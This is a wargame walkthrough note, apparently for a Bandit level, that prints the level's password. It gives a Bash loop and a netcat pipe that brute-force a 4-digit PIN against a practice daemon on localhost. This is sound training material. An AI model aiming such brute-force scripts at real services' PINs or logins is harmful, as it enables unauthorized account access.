**Password**: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
**Tools**: [[netcat (nc)]], [[Brute force]], [[Bash scripting]]

**Prev**: [[Level 23]]
**Next**: [[Level 25]]
## Solution
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

so we use [[netcat (nc)]] to send a combination like `current_password 4_digit_picode`
first, we need create a dictionary with all that combinations.
```bash
#!/bin/bash

for i in {0000..9999}; do
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done
```
if we execute this redirection the output to new file, almost ready
```bash
chmod +x script.sh && ./script.sh > dictionary.txt
```
now just need send all file to daemon running in port 30002
```bash
cat dictionary.txt | nc localhost 30002
```
and eventually we found the password.